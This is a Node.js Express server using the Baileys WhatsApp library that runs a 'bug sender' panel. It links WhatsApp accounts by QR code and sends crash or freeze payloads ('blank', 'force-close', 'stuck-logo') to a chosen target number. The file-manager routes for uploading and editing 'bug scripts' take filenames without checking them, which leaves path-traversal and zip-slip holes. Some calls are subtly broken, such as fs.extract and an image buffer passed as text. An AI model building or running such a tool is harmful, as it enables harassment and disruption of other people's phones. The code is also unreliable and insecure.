const express = require('express');
const http = require('http');
const fs = require('fs-extra');
const path = require('path');
const { default: makeWASocket, useSingleFileAuthState, DisconnectReason } = require('@adiwajshing/baileys');
const fileUpload = require('express-fileupload');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files
app.use(fileUpload()); // For file uploads

const senders = {}; // Object to store active sender instances { id: { client, state } }
const senderDir = path.join(__dirname, 'senders'); // Base directory for sender files
fs.ensureDirSync(senderDir); // Ensure the directory exists

// Home Page Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/index.html'));
});

// Route to Add a New Sender (Initiates QR Scan)
app.post('/add-sender', async (req, res) => {
    const senderId = `sender${Date.now()}`; // Unique ID for the sender
    const senderPath = path.join(senderDir, senderId);
    fs.ensureDirSync(senderPath); // Create a directory for this sender's files

    const { state, saveState } = useSingleFileAuthState(path.join(senderPath, 'auth_info.json')); // Baileys auth state

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false, // Don't print QR in terminal; we'll handle it via Socket.io
    });

    sock.ev.on('connection.update', (update) => {
        const { qr } = update;
        if (qr) {
            io.emit('qr-code', { senderId, qr }); // Send QR to frontend via Socket.io
        }
        if (update.isNewLogin) {
            io.emit('sender-connected', { senderId, message: 'Sender connected successfully!' });
        }
    });

    sock.ev.on('creds.update', saveState); // Save auth state

    senders[senderId] = { client: sock, path: senderPath }; // Store the sender

    res.json({ success: true, senderId });
});

// Route to Send Bug
app.post('/send-bug', async (req, res) => {
    const { senderId, targetNumber, bugType } = req.body; // e.g., bugType: 'blank', 'force-close', 'stuck-logo'
    if (!senders[senderId] || !senders[senderId].client) {
        return res.status(400).json({ error: 'Sender not found or not connected' });
    }

    const sock = senders[senderId].client;
    let messageContent;

    switch (bugType) {
        case 'blank':
            messageContent = ''; // Empty message
            break;
        case 'force-close':
            messageContent = 'A'.repeat(1000000); // Large string to potentially force close
            break;
        case 'stuck-logo':
            messageContent = { image: Buffer.alloc(1024 * 1024, 0) }; // Large buffer to simulate stuck
            break;
        default:
            return res.status(400).json({ error: 'Invalid bug type' });
    }

    try {
        await sock.sendMessage(targetNumber + '@s.whatsapp.net', { text: messageContent }); // Send via Baileys
        res.json({ success: true, message: 'Bug sent successfully!' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to send bug: ' + error.message });
    }
});

// File Manager Routes (Similar to Pterodactyl)
// 1. List files in a sender's directory
app.get('/file-manager/:senderId', async (req, res) => {
    const { senderId } = req.params;
    if (!senders[senderId]) return res.status(404).json({ error: 'Sender not found' });
    const dirPath = senders[senderId].path;
    try {
        const files = await fs.readdir(dirPath);
        res.json({ files });
    } catch (error) {
        res.status(500).json({ error: 'Error reading files' });
    }
});

// 2. Upload and Extract Files (e.g., for bug scripts)
app.post('/file-manager/:senderId/upload', async (req, res) => {
    const { senderId } = req.params;
    if (!senders[senderId]) return res.status(404).json({ error: 'Sender not found' });
    const dirPath = senders[senderId].path;

    if (!req.files || !req.files.file) return res.status(400).json({ error: 'No file uploaded' });
    const uploadedFile = req.files.file;
    const filePath = path.join(dirPath, uploadedFile.name);

    try {
        await uploadedFile.mv(filePath); // Save the file
        if (path.extname(uploadedFile.name) === '.zip') { // Assuming it's a zip of scripts
            await fs.extract(filePath, dirPath); // Extract using fs-extra
            await fs.unlink(filePath); // Delete the zip after extraction
        }
        res.json({ success: true, message: 'File uploaded and extracted' });
    } catch (error) {
        res.status(500).json({ error: 'Upload failed' });
    }
});

// 3. Edit a File
app.post('/file-manager/:senderId/edit', async (req, res) => {
    const { senderId, filename, content } = req.body;
    if (!senders[senderId]) return res.status(404).json({ error: 'Sender not found' });
    const filePath = path.join(senders[senderId].path, filename);
    try {
        await fs.writeFile(filePath, content);
        res.json({ success: true, message: 'File edited successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Error editing file' });
    }
});

// Socket.io for Real-Time QR Handling
io.on('connection', (socket) => {
    console.log('A user connected');
    socket.on('disconnect', () => console.log('User disconnected'));
});

server.listen(3000, () => console.log('Server running on port 3000'));
